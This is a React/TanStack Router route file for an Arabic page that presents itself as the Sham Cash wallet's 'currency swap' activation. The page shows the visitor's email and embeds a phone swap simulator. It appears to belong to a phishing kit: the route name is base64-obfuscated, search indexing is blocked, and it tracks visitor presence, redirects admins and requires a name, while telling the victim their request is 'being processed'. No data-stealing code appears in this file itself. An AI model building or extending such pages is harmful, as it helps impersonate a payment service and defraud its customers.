import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { AppScreen } from "@/components/app-screen";
import { PhoneSwapSimulator } from "@/components/phone-swap-simulator";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { useRequireName } from "@/lib/require-name";

const searchSchema = z.object({ email: z.string().optional() });

export const Route = createFileRoute("/c3dhcA")({
  ssr: false,
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "تبديل العملة | شام كاش" },
      { name: "description", content: "تفعيل خيار تبديل العملة على حساب شام كاش." },
      { property: "og:title", content: "تبديل العملة — شام كاش" },
      { property: "og:description", content: "طلب إضافة خيار تبديل العملة قيد المعالجة." },
    ],
  }),
  component: SwapPage,
});

function SwapPage() {
  usePresenceTracker({ page: "/c3dhcA" });
  useAdminRedirect();
  useRequireName();
  const { email } = Route.useSearch();
  return (
    <AppScreen width="sm">
      <div dir="rtl" className="flex flex-col items-center text-center text-white">
        <h1 className="text-2xl font-bold sm:text-3xl">تبديل العملة</h1>
        <p className="mx-auto mt-3 max-w-sm text-sm leading-7 text-white/70">
          جرّب تجربة التبديل من داخل هذا الهاتف الواقعي.
        </p>
        {email ? (
          <div className="mt-5 w-full rounded-2xl bg-white/[0.06] px-4 py-2.5 text-xs text-white/80 ring-1 ring-white/10">
            البريد المسجّل: <span className="font-medium text-white">{email}</span>
          </div>
        ) : null}

        <div className="mt-6 w-full">
          <PhoneSwapSimulator />
        </div>
      </div>
    </AppScreen>
  );
}
